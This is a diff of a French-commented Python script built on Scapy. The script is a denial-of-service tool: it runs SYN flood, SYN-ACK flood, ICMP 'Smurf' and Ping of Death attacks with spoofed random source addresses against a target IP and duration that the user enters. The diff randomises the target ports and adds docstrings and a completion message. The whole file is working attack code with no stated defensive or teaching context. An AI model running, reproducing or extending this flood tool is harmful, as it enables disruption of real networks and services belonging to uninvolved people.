@@ -4,47 +4,54 @@ import time
 import sys
 
 def generate_random_ip():
-    return '.'.join(str(random.randint(1, 254)) for _ in range(4))  # Génère des IP valides
+    """Génère une adresse IP valide aléatoire."""
+    return '.'.join(str(random.randint(1, 254)) for _ in range(4))
 
 def send_packet(packet):
+    """Envoie un paquet avec verbose désactivé."""
     send(packet, verbose=0)
 
-def attack_syn_flood(target_ip, target_port, duration):
-    """SYN Flood Attack"""
+def attack_syn_flood(target_ip, duration):
+    """SYN Flood Attack."""
     start_time = time.time()
     while time.time() - start_time < duration:
-        packet = IP(src=generate_random_ip(), dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
+        target_port = random.randint(1024, 65535)  # Port aléatoire
+        src_ip = generate_random_ip()
+        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
         send_packet(packet)
 
-def attack_syn_ack(target_ip, target_port, duration):
-    """SYN-ACK Flood Attack"""
+def attack_syn_ack(target_ip, duration):
+    """SYN-ACK Flood Attack."""
     start_time = time.time()
     while time.time() - start_time < duration:
-        packet = IP(src=generate_random_ip(), dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="SA")
+        target_port = random.randint(1024, 65535)  # Port aléatoire
+        src_ip = generate_random_ip()
+        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="SA")
         send_packet(packet)
-        
+
 def attack_smurf(target_ip, duration):
-    """Smurf Attack"""
+    """Smurf Attack."""
     start_time = time.time()
     while time.time() - start_time < duration:
-        send_packet(IP(src=generate_random_ip(), dst=target_ip) / ICMP())  # Envoi direct du paquet
-
-
+        src_ip = generate_random_ip()
+        packet = IP(src=src_ip, dst=target_ip) / ICMP()
+        send_packet(packet)
 
 def attack_pod(target_ip, duration):
-    """Ping of Death (PoD) Attack"""
+    """Ping of Death (PoD) Attack."""
     start_time = time.time()
     while time.time() - start_time < duration:
-        packet = IP(src=generate_random_ip(), dst=target_ip) / ICMP() / Raw(b"A" * 6000)
+        src_ip = generate_random_ip()
+        packet = IP(src=src_ip, dst=target_ip) / ICMP() / Raw(b"A" * 6000)
         send_packet(packet)
 
 def ddos(target_ip, attack_type, duration):
-    target_port = 80  # Port standard utilisé pour les attaques TCP
+    """Gestion des attaques DDoS."""
     conf.verb = 0  # Désactiver les messages de sortie Scapy
     if attack_type == "syn_flood":
-        attack_syn_flood(target_ip, target_port, duration)
+        attack_syn_flood(target_ip, duration)
     elif attack_type == "syn_ack":
-        attack_syn_ack(target_ip, target_port, duration)
+        attack_syn_ack(target_ip, duration)
     elif attack_type == "smurf":
         attack_smurf(target_ip, duration)
     elif attack_type == "pod":
@@ -64,6 +71,7 @@ if __name__ == "__main__":
         duration = float(input("Durée de l'attaque (en secondes) : "))
 
         ddos(target_ip, attack_type, duration)
+        print(f"Tous les paquets pour l'attaque {attack_type} ont été envoyés à {target_ip}.")
 
     except KeyboardInterrupt:
         print("\nArrêt par l'utilisateur.")
